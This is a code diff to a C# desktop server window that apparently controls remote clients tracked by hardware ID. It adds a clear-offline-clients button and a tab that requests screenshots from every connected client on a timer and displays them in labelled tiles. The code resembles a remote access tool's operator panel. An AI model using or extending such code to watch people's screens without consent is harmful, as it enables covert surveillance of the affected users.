@@ -568,6 +568,22 @@ public partial class ServerWindow : Window
             .OrderByDescending(r => r.LastSeen);
         GridAllClients.ItemsSource = null;
         GridAllClients.ItemsSource = new ObservableCollection<ClientRecord>(clients);
+        if (TxtAllClientsCount != null)
+            TxtAllClientsCount.Text = $"{_store.AllClients.Count} records";
+    }
+
+    private void ClearOfflineClients_Click(object s, RoutedEventArgs e)
+    {
+        if (_server == null) return;
+        var onlineHwids = _server.ConnectedClients.Values
+            .Select(c => c.Hwid).ToHashSet(StringComparer.OrdinalIgnoreCase);
+        var toRemove = _store.AllClients.Keys
+            .Where(hwid => !onlineHwids.Contains(hwid)).ToList();
+        foreach (var k in toRemove)
+            _store.AllClients.TryRemove(k, out _);
+        _store.Save();
+        RefreshAllClients();
+        Log($"[*] Cleared {toRemove.Count} offline client record(s).");
     }
 
     private void RefreshUptime()
@@ -3627,8 +3643,151 @@ Read-Host 'Press Enter to close'
         return nint.Zero;
     }
 
+    // ── Screen tab ─────────────────────────────────────────────────────────────
+
+    private DispatcherTimer? _screenTimer;
+    private readonly Dictionary<string, System.Windows.Controls.Image> _screenTiles = new();
+    private readonly HashSet<string> _screenHandlers = new();
+
+    private void ScreenStart_Click(object sender, RoutedEventArgs e)
+    {
+        if (_server == null) return;
+        BtnScreenStart.IsEnabled = false; BtnScreenStart.Opacity = 0.35;
+        BtnScreenStop.IsEnabled  = true;  BtnScreenStop.Opacity  = 1.0;
+
+        SldScreenInterval.ValueChanged += SldScreenInterval_ValueChanged;
+
+        _screenTimer = new DispatcherTimer
+            { Interval = TimeSpan.FromSeconds(Math.Max(1, (int)SldScreenInterval.Value)) };
+        _screenTimer.Tick += (_, _) => RequestScreenshots();
+        _screenTimer.Start();
+        RequestScreenshots();
+    }
+
+    private void SldScreenInterval_ValueChanged(object? sender,
+        System.Windows.RoutedPropertyChangedEventArgs<double> e)
+    {
+        TxtScreenInterval.Text = $"{(int)e.NewValue}s";
+        if (_screenTimer != null)
+            _screenTimer.Interval = TimeSpan.FromSeconds(Math.Max(1, (int)e.NewValue));
+    }
+
+    private void ScreenStop_Click(object sender, RoutedEventArgs e)
+    {
+        _screenTimer?.Stop(); _screenTimer = null;
+        SldScreenInterval.ValueChanged -= SldScreenInterval_ValueChanged;
+        BtnScreenStart.IsEnabled = true;  BtnScreenStart.Opacity = 1.0;
+        BtnScreenStop.IsEnabled  = false; BtnScreenStop.Opacity  = 0.35;
+        foreach (var id in _screenHandlers.ToList())
+            _server?.UnregisterHandler(id, PacketType.ScreenshotResult);
+        _screenHandlers.Clear();
+    }
+
+    private void RequestScreenshots()
+    {
+        if (_server == null) return;
+        var clients = _server.ConnectedClients.Values.ToList();
+        TxtScreenCount.Text = $"{clients.Count} client{(clients.Count != 1 ? "s" : "")}";
+
+        // Remove tiles for disconnected clients
+        var ids = clients.Select(c => c.Id).ToHashSet();
+        foreach (var key in _screenTiles.Keys.Where(k => !ids.Contains(k)).ToList())
+        {
+            if (_screenTiles[key].Parent is System.Windows.FrameworkElement fe)
+            {
+                var panel = VisualTreeHelperGetParent(fe);
+                if (panel is System.Windows.Controls.WrapPanel wp) wp.Children.Remove(fe);
+            }
+            _screenTiles.Remove(key);
+        }
+
+        foreach (var client in clients)
+        {
+            EnsureScreenTile(client);
+            if (!_screenHandlers.Contains(client.Id))
+            {
+                var id = client.Id;
+                _server.RegisterHandler(id, PacketType.ScreenshotResult,
+                    pkt => OnScreenshotResult(id, pkt.Data));
+                _screenHandlers.Add(id);
+            }
+            _ = _server.SendToClient(client.Id, new Packet { Type = PacketType.Screenshot });
+        }
+    }
+
+    private static System.Windows.DependencyObject? VisualTreeHelperGetParent(
+        System.Windows.DependencyObject obj)
+        => System.Windows.Media.VisualTreeHelper.GetParent(obj);
+
+    private void EnsureScreenTile(ConnectedClient client)
+    {
+        if (_screenTiles.ContainsKey(client.Id)) return;
+
+        var img = new System.Windows.Controls.Image
+        {
+            Stretch = Stretch.Uniform,
+            Height  = 160,
+            HorizontalAlignment = HorizontalAlignment.Stretch
+        };
+
+        var label = new TextBlock
+        {
+            Text = $"{client.Username}  [{client.Id[..Math.Min(8, client.Id.Length)]}]  {client.IP}",
+            Foreground = new SolidColorBrush(Color.FromRgb(0x50, 0x58, 0x80)),
+            FontSize = 9.5, FontFamily = new System.Windows.Media.FontFamily("Consolas"),
+            Margin = new Thickness(6, 3, 6, 4),
+            TextTrimming = System.Windows.TextTrimming.CharacterEllipsis
+        };
+
+        var dp = new System.Windows.Controls.DockPanel();
+        System.Windows.Controls.DockPanel.SetDock(label, System.Windows.Controls.Dock.Bottom);
+        dp.Children.Add(label);
+        dp.Children.Add(img);
+
+        var border = new System.Windows.Controls.Border
+        {
+            Width = 264, Margin = new Thickness(5),
+            Background   = new SolidColorBrush(Color.FromRgb(0x07, 0x08, 0x12)),
+            BorderBrush  = new SolidColorBrush(Color.FromRgb(0x1A, 0x1E, 0x36)),
+            BorderThickness = new Thickness(1),
+            CornerRadius = new System.Windows.CornerRadius(6),
+            Child = dp
+        };
+
+        ScreenPanel.Children.Add(border);
+        _screenTiles[client.Id] = img;
+    }
+
+    private void OnScreenshotResult(string clientId, string json)
+    {
+        try
+        {
+            var result = Newtonsoft.Json.JsonConvert.DeserializeObject<ScreenshotResultData>(json);
+            if (result == null || string.IsNullOrEmpty(result.Data)) return;
+            Dispatcher.BeginInvoke(() =>
+            {
+                if (!_screenTiles.TryGetValue(clientId, out var img)) return;
+                try
+                {
+                    var bytes = Convert.FromBase64String(result.Data);
+                    using var ms = new System.IO.MemoryStream(bytes);
+                    var bmp = new System.Windows.Media.Imaging.BitmapImage();
+                    bmp.BeginInit();
+                    bmp.CacheOption = System.Windows.Media.Imaging.BitmapCacheOption.OnLoad;
+                    bmp.StreamSource = ms;
+                    bmp.EndInit();
+                    bmp.Freeze();
+                    img.Source = bmp;
+                }
+                catch { }
+            });
+        }
+        catch { }
+    }
+
     private void Close_Click(object sender, RoutedEventArgs e)
     {
+        _screenTimer?.Stop();
         _server?.Stop();
         Application.Current.Shutdown();
     }
